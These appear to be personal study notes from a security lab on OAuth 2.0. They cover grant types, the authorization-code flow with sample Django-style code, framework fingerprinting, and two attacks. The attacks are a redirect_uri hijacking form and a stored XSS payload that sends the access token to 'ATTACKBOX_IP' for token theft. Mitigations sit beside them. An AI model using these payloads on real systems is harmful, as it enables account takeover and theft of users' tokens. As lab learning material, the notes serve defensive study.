# Type of Oauth Grant
## Authorization Code Grant
This method is the **most commonly used** for serverside applications.
![[Pasted image 20241225111537.png]]
To explain it let's imagine you are a kid and you want to play with your friend's toy:
1. You **ask to play** (like accessing the application)
2. Your friend **checks if it's really you** (**authentication**)
3. If it's you, your friend **agrees to let you borrow the toy** (**authorization**)
4. They **give you a special ticket** (**authorization code**)
5. You **show this ticket** to their parents (like the app **requesting a token**)
6. The parents **give you a special bracelet** (**access token**)
7. You can now use the toy by **showing your bracelet**
## Implicit Grant
This method is mainly used for mobile and web **applications that can't securely store secrets**.
![[Pasted image 20241225112147.png]]
Imagine a theme park scenario:
1. You **arrive at the park** (**accessing the application**)
2. You **show your ID** at the entrance (**authentication**)
3. The park verifies your age and **lets you in** (**authorization**)
4. You **get your access bracelet immediately** (**access token in URL**)
5. You use your **bracelet to access** rides (**resource request**)

Key **differences** from the previous method:
- **Faster** with fewer steps
- Bracelet given directly (**no intermediate ticket**)
- **Less secure** as the bracelet is **visible to everyone**
- No option to get a new bracelet without re-queuing (**no refresh token**)
## Resource Owner Password Credentials Grant
This method is like giving your keys to someone you **completely trust**.
![[Pasted image 20241225112622.png]]
Imagine a family trust scenario:
1. You give your **username and password to your mom** (**direct credentials**)
2. Mom **uses this info** to talk to the teacher (**sends credentials**)
3. Teacher **gives** mom **a special pass** (**access token**)
4. Mom **uses this pass to access** your grades (**token request**)
5. She gets your grades (resource access)

Key points:
- **Fast but less secure**
- Only for **highly trusted apps**
- **Direct sharing of credentials**
- Not recommended for third-party apps
## Client Credentials Grant
It's like two machines talking using their security badges, with no need for human interaction.
![[Pasted image 20241225113123.png]]Imagine a robot-to-robot scenario:
1. Robot A **shows its special ID card** (Client ID and Secret)
2. Robot B **gives access** code
3. Robot A **uses code to request data**
4. **Data is shared**

Key points:
- **No human** involvement
- Direct **server-to-server communication**
- **Machine-only credentials**
- Perfect for **automated services**
# Oauth2 Flow
![[Pasted image 20241225113654.png]]
This exemple work for all oAuth2 provider (Google, Facebook, ...)
## Authorization request
![[Pasted image 20241225114149.png]]
When you click on this button you are redirected to this type of url:
`http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback` 
Here is the params of the url:
- **`response_type=code`**: Show that `CoffeeShopApp`, the user, wait for an auth code. 
- **`state`**: A CSRF token to ensure the request and response are part of the same transaction.
- **`client_id`** : The unique public client application id `CoffeeShopApp`.
- **`redirect_uri`**: The url where the server will redirect the user.
- **`scope`**:  Specifies the level of access requested, such as viewing coffee orders.

We can imagine a code like this:
```python
def oauth_login(request): 
	app = Application.objects.get(name="CoffeeApp")
	redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
	authorization_url = (
	f"http://coffee.thm:8000/o/authorize/?client_id {app.client_id}&response_type=code&redirect_uri={redirect_uri}" 
	) 
	return redirect(authorization_url)
```
## Authentification & Authorization
The process commonly used is:
- **User login**: the user enter his credentials
- **Consent prompt**: After authentification, the autorization server presents a consent screen detailing what the client requests access to.
![[Pasted image 20241225115321.png]]
## Authorization Response
If all is ok, the server generate an **authorization code**. The the server redirect the user to the website using the `redirect_uri` with 2 params:
- **`code`**: `CoffeeShopApp` will use the **authorisation code to request an access token**.
- **`state`**: The **CSRF token previously sent** by `CoffeeShopApp` **to validate the response**.
For exemple:
 `https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123`.
## Token Request
The website exchange the authorisation code with the server to get an access token.
He use a post request with these parameters:
- **`grant_type`**: type of grant being used; usually, it's set as `code` to specify authorization code as the grant type.
- **`code`**: The authorization **code received** from the authorization server.
- **`redirect_uri`**: This must **match the original redirect URI provided** in the authorization request.
- **`client_id and client_secret`**: **Credentials for authenticating** the client application.

Exemple of code:
```python
	token_url = "http://coffee.thm:8000/o/token/"
    client_id = Application.objects.get(name="CoffeeApp").client_id
    client_secret = Application.objects.get(name="CoffeeApp").client_secret
    redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
    
    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "client_secret": client_secret,
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
    }
    
    response = requests.post(token_url, data=data, headers=headers)
    tokens = response.json()
        
```
## Token Response
The authorization server's response includes the following:
- **`access_token`**: **Token that will be used** to access user's details.
- **`token_type`**: Typically "Bearer".
- **`expires_in`**: The **duration in seconds** for which the **access token is valid**.
- **`refresh_token (optional)`**: A **token used to obtain new access tokens** without requiring the user to log in again.
# Identify the framework
Its important to indentify the oAuth framework used to find exploit or bugs.
- **HTTP Headers and Responses**: Inspect HTTP headers and response bodies for unique identifiers or comments referencing specific OAuth libraries or frameworks.
- **Source Code Analysis**: If you can access the application's source code, search for specific keywords and import statements that can reveal the framework in use. For instance, libraries like `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`, or `passport` in `Node.js`, each have unique characteristics and naming conventions.
- **Authorization and Token Endpoints**: Analyze the endpoints used to obtain authorization codes and access tokens. Different OAuth implementations might have unique endpoint patterns or structures. For example, the `Django OAuth Toolkit` typically follows the pattern `/oauth/authorize/` and `/oauth/token/`, while other frameworks might use different paths.
- **Error Messages**: Error might include reference to the framework
# Exploit
## OAuth Token Hijacking via Redirect URI
OAuth 2.0 uses tokens to authorize access to protected resources. The vulnerability exploits the redirect_uri parameter to intercept these tokens.
### How it Works
1. **Normal Setup**
   - Application registers authorized redirect URLs
   - Tokens are sent to these URLs after authentication
2. **The Attack**
   - Attacker controls a domain listed in authorized redirect_uri
   - Creates malicious page that forces redirection to their domain
   - Victim logs in via OAuth
   - Token is sent to attacker-controlled domain
3. **Exploitation**
   - Attacker captures authorization code
   - Exchanges it for valid access token
   - Can then access victim's resources
### Exploit Code
Malicious redirect page exemple:
```html
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
    <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
    <input type="submit" value="Login">
</form>
```
### Protection
- Strictly validate redirect_uri
- Regularly audit authorized domains
- Implement additional security controls
## OAuth Implicit Grant Flow Vulnerability
The implicit grant flow directly returns access tokens to the client through the browser without an authorization code.
### Key Vulnerabilities
- **Access token exposed in URL** fragment
- Tokens **accessible to any JavaScript on the page**
- **Vulnerable to XSS** attacks
- **Insecure token storage** (localStorage/sessionStorage)
### Attack Example
Put this payload in a form to store it in the server.
**Exploit Payload**
```javascript
<script>
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function (res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
}, {});
var accessToken = result.access_token;
var img = new Image();
img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```
### Attack Flow
1. Attacker enters malicious XSS payload in status field
2. Page refresh executes the payload
3. Script extracts access token from URL fragment
4. Token sent to attacker's server
5. Attacker gains unauthorized access
### Security Recommendations
- Replace implicit flow with authorization code flow + PKCE
- Implement strict **HTTPS**
- **Validate redirect URIs**
- **Protect against XSS** attacks